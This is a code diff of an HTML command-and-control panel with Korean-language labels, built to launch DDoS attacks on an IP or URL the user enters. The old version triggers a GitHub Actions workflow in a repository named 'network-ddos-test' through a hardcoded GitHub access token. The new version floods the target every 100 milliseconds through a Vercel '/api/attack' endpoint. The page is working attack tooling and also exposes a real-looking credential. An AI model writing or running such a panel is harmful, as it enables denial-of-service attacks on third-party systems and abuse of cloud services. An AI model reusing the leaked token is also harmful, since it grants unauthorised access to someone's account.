@@ -1,69 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GITHUB C2 PANEL - FINAL</title>
+    <title>VERCEL EDGE C2 - FINAL</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
         input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 300px; margin-bottom: 20px; outline: none; }
         button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; font-size: 1.1em; }
         button:hover { background: #0c0; box-shadow: 0 0 10px #0f0; }
-        #log { margin-top: 20px; font-size: 1.2em; font-weight: bold; }
+        #log { margin-top: 20px; font-size: 1.2em; font-weight: bold; height: 200px; overflow-y: auto; background: #111; padding: 10px; }
     </style>
 </head>
 <body>
-    <h1>[ GITHUB NATIVE C2 ]</h1>
-    <p>공격 대상 IP 또는 URL 입력:</p>
+    <h1>[ VERCEL EDGE C2 ]</h1>
+    <p>대상 IP 또는 URL 입력 (토큰 필요 없음):</p>
     <input type="text" id="target" placeholder="http://1.2.3.4" value="http://">
     <br>
-    <button onclick="launchAttack()">공격 시작 (LAUNCH)</button>
-    <div id="log" style="color: #888;">상태: 대기 중...</div>
+    <button onclick="startAttack()">초고속 연사 시작 (FIRE)</button>
+    <div id="log">상태: 대기 중...</div>
 
     <script>
-        // 제공해주신 새 토큰 주입 (ghp_9pux...)
-        const TOKEN = "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";
-        const REPO = "hahahghshaha-svg/network-ddos-test";
-
-        async function launchAttack() {
-            const targetIp = document.getElementById('target').value;
+        async function startAttack() {
+            const target = document.getElementById('target').value;
             const logDiv = document.getElementById('log');
-            logDiv.style.color = "#ff0";
-            logDiv.innerText = "명령 전송 중... (Sending Command)";
+            logDiv.innerHTML = `<span style="color:yellow">공격 개시: ${target}</span><br>`;
 
-            try {
-                // 1. 저장소 변수(TARGET_IP) 업데이트
-                const varRes = await fetch(`https://api.github.com/repos/${REPO}/actions/variables/TARGET_IP`, {
-                    method: 'PATCH',
-                    headers: { 
-                        'Authorization': `Bearer ${TOKEN}`, 
-                        'Accept': 'application/vnd.github+json',
-                        'X-GitHub-Api-Version': '2022-11-28'
-                    },
-                    body: JSON.stringify({ name: 'TARGET_IP', value: targetIp })
-                });
-
-                // 2. 공격 엔진(Actions) 강제 실행
-                const runRes = await fetch(`https://api.github.com/repos/${REPO}/actions/workflows/main.yml/dispatches`, {
-                    method: 'POST',
-                    headers: { 
-                        'Authorization': `Bearer ${TOKEN}`, 
-                        'Accept': 'application/vnd.github+json',
-                        'X-GitHub-Api-Version': '2022-11-28'
-                    },
-                    body: JSON.stringify({ ref: 'main' })
-                });
-
-                if (runRes.ok) {
-                    logDiv.style.color = "#0f0";
-                    logDiv.innerText = "성공: 5개 서버 노드가 " + targetIp + " 타격 개시!";
-                } else {
-                    const errData = await runRes.json();
-                    logDiv.style.color = "#f00";
-                    logDiv.innerText = "오류 발생 (" + runRes.status + "): " + (errData.message || "권한 부족");
+            // 0.1초마다 Vercel 에지 엔진(/api/attack) 호출
+            setInterval(async () => {
+                try {
+                    // GitHub API를 거치지 않고 내 Vercel 서버로 직접 쏨
+                    const res = await fetch(`/api/attack?target=${target}`);
+                    const text = await res.text();
+                    const line = document.createElement('div');
+                    line.innerText = `> ${new Date().toLocaleTimeString()} : ${text}`;
+                    logDiv.prepend(line);
+                } catch (e) {
+                    console.error("연사 실패:", e);
                 }
-            } catch (e) {
-                logDiv.style.color = "#f00";
-                logDiv.innerText = "통신 실패: " + e;
-            }
+            }, 100); 
         }
     </script>
 </body>
